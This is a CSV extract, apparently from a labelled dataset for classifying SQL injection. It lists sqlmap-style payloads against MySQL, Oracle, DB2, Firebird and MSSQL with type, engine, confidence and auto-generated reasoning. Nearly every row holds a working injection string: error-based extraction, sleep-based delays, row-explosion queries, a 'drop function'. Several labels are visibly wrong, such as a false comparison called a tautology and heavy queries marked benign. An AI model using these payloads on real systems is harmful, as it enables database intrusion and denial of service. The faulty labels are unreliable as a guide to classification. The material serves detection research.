id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18587,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'kird' = 'kird",boolean_blind,mysql,0.85,numeric tautology '3393 = 3393' acts as boolean true branch ; secondary signals: 'updatexml (' (error_based) ; db_engine=mysql,2
18588,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 4976 = 4976",boolean_blind,oracle,0.95,numeric tautology '4976 = 4976' acts as boolean true branch ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18589,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and 'mabd' = 'mabd,auth_bypass,mysql,0.75,"login-bypass tautology '' = '' typical of auth_bypass ; secondary signals: 'rlike' (boolean_blind), 'sleep (' (time_blind) ; db_engine=mysql",1
18590,1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'nuis' = 'nuis,boolean_blind,oracle,0.95,numeric tautology '7756 = 7756' acts as boolean true branch ; db_engine=oracle,3
18591,1'+ ( select taga where 8036 = 8036,boolean_blind,generic,0.95,injected WHERE-tautology 'where 8036 = 8036' is boolean true oracle ; db_engine=generic,3
18592,"1%"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""%"" = """,boolean_blind,mysql,0.85,numeric tautology '7982 = 7982' acts as boolean true branch ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18593,"1' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'jicq' like 'jicq",boolean_blind,mysql,0.85,numeric tautology '9067 = 9067' acts as boolean true branch ; db_engine=mysql,2
18594,1'|| ( select 'cfff' where 4994 = 4994,boolean_blind,generic,0.95,injected WHERE-tautology 'where 4994 = 4994' is boolean true oracle ; db_engine=generic,3
18595,1'+ ( select 'leok' where 4320 = 4320,boolean_blind,generic,0.95,injected WHERE-tautology 'where 4320 = 4320' is boolean true oracle ; db_engine=generic,3
18596,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 1473 = 1473",boolean_blind,firebird,0.95,numeric tautology '1473 = 1473' acts as boolean true branch ; db_engine=firebird,3
18597,1'|| ( select 'qgnz' where 6446 = 6446,boolean_blind,generic,0.95,injected WHERE-tautology 'where 6446 = 6446' is boolean true oracle ; db_engine=generic,3
18598,"1%"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,boolean_blind,mysql,0.85,numeric tautology '6270 = 6270' acts as boolean true branch ; secondary signals: 'exp (' (error_based) ; db_engine=mysql,2
18599,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%' = '",benign,db2,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment 'select count ( * ) from sysibm.systables',1
18600,1'+ ( select ijoh where 7145 = 7145 order by 1--,boolean_blind,generic,0.95,injected WHERE-tautology 'where 7145 = 7145' is boolean true oracle ; db_engine=generic,3
18601,if ( 1087 = 5839 ) select 1087 else drop function zzeh--,boolean_blind,generic,0.95,numeric tautology '1087 = 5839' acts as boolean true branch ; db_engine=generic,3
18602,-8753 ) order by 1#,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '-8753 ) order by 1#',0
18603,"1' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'hfqz' = 'hfqz",boolean_blind,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' ) ) or 9643 = ( select count ( * ) from domain.domains as',0
18604,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""%"" = """,benign,db2,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment 'select count ( * ) from sysibm.systables',1
18605,1'+ ( select wpai where 3685 = 3685,boolean_blind,generic,0.95,injected WHERE-tautology 'where 3685 = 3685' is boolean true oracle ; db_engine=generic,3
18606,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'frpo' like 'frpo",boolean_blind,generic,0.85,LIKE tautology ''frpo' like 'frpo' yields boolean true/false ; db_engine=generic,2
18607,1' ) ) as grne where 9003 = 9003 order by 1--,boolean_blind,generic,0.85,injected WHERE-tautology 'where 9003 = 9003' is boolean true oracle ; db_engine=generic,2
18608,"1 where 3410 = 3410 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,injected WHERE-tautology 'where 3410 = 3410' is boolean true oracle ; db_engine=firebird,3
18609,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3#",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: 'select count ( * ) from domain.domains as t1,domain.columns '",0
18610,"1' ) ) as lmsl where 3753 = 3753 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,injected WHERE-tautology 'where 3753 = 3753' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18611,"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""hxgu"" = ""hxgu",boolean_blind,mysql,0.85,numeric tautology '6272 = 6272' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18612,"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",boolean_blind,mysql,0.85,numeric tautology '1808 = 1808' acts as boolean true branch ; secondary signals: 'updatexml (' (error_based) ; db_engine=mysql,2
18613,"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""eiuc"" like ""eiuc",boolean_blind,mysql,0.85,numeric tautology '7982 = 7982' acts as boolean true branch ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18614,"1"" ) where 1666 = 1666 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,injected WHERE-tautology 'where 1666 = 1666' is boolean true oracle ; db_engine=generic,3
18615,"1"" ) )",benign,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '1"" ) )'",0
18616,"1 where 2823 = 2823 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,injected WHERE-tautology 'where 2823 = 2823' is boolean true oracle ; db_engine=db2,3
18617,-2912' ) ) order by 1--,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '-2912' ) ) order by 1--',0
18618,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",benign,db2,0.85,No SQLi tokens found in payload (no UNION/SLEEP/extractvalue/OR 1=1/--/;EXEC etc.); payload appears as benign SQL fragment 'select count ( * ) from sysibm.systables',1
18619,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",boolean_blind,firebird,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: 'select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb'",0
18620,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'ynpr' = 'ynpr",boolean_blind,firebird,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$'",0
18621,"1' in boolean mode ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18622,"1"" ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""wdye"" like ""wdye",boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1"" ) ) or 4411 = ( select count ( * ) from sysusers as sys1,'",0
18623,"1', ( select ( case when ( 3902 = 3902 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1/ ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.95,numeric tautology '3902 = 3902' acts as boolean true branch ; secondary signals: 'all_users' (heavy_query) ; db_engine=oracle,3
18624,"1%"" ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%"" ) ) or 7417 = ( select count ( * ) from sysibm.systables'",0
18625,"1"" ) ) as uzvu where 2458 = 2458 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.85,injected WHERE-tautology 'where 2458 = 2458' is boolean true oracle ; db_engine=mysql,2
18626,"1%' ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,numeric tautology '3114 = 3114' acts as boolean true branch ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,2
18627,"1%"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""%"" = """,boolean_blind,generic,0.50,"UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%"" ) or 4411 = ( select count ( * ) from sysusers as sys1,s'",0
18628,"1%' ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.75,5 cartesian aliases of 'all_users' produce row explosion → heavy_query ; db_engine=oracle,1
18629,"1"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""rfpq"" = ""rfpq",boolean_blind,mysql,0.85,numeric tautology '7982 = 7982' acts as boolean true branch ; secondary signals: 'extractvalue (' (error_based) ; db_engine=mysql,2
18630,1'+ ( select 'sbji' where 7989 = 7989 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',boolean_blind,mysql,0.95,injected WHERE-tautology 'where 7989 = 7989' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18631,"1 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) -- dkwz",boolean_blind,mysql,0.85,numeric tautology '8190 = 8190' acts as boolean true branch ; secondary signals: 'exp (' (error_based) ; db_engine=mysql,2
18632,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'eomt' = 'eomt",boolean_blind,db2,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1' or 8315 = ( select count ( * ) from sysibm.systables as t',0
18633,"1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'thce' = 'thce",boolean_blind,mysql,0.85,numeric tautology '6270 = 6270' acts as boolean true branch ; secondary signals: 'exp (' (error_based) ; db_engine=mysql,2
18634,"1%' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",boolean_blind,generic,0.50,UNCERTAIN: no specific SQLi signal token matched in payload '1%' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substri'; cannot determine type confidently.,0
18635,"1"" ) as crek where 6570 = 6570 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.85,injected WHERE-tautology 'where 6570 = 6570' is boolean true oracle ; db_engine=generic,2
18636,1 ) as xylu where 3338 = 3338 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,boolean_blind,mysql,0.95,injected WHERE-tautology 'where 3338 = 3338' is boolean true oracle ; secondary signals: 'sleep (' (time_blind) ; db_engine=mysql,3
18637,1' order by 1--,benign,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'benign'. Payload fragment: '1' order by 1--',0
18638,"1%' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( '%' = '",boolean_blind,generic,0.50,UNCERTAIN: no rule-pattern match; both sources A and C agree on 'boolean_blind'. Payload fragment: '1%' ) ) or 9643 = ( select count ( * ) from domain.domains a',0
18639,-2648' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'sawt' = 'sawt,boolean_blind,oracle,0.95,numeric tautology '4747 = 4747' acts as boolean true branch ; db_engine=oracle,3
18640,select ( case when ( 4666 = 4666 ) then 1 else 4666* ( select 4666 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.95,numeric tautology '4666 = 4666' acts as boolean true branch ; db_engine=mssql,3
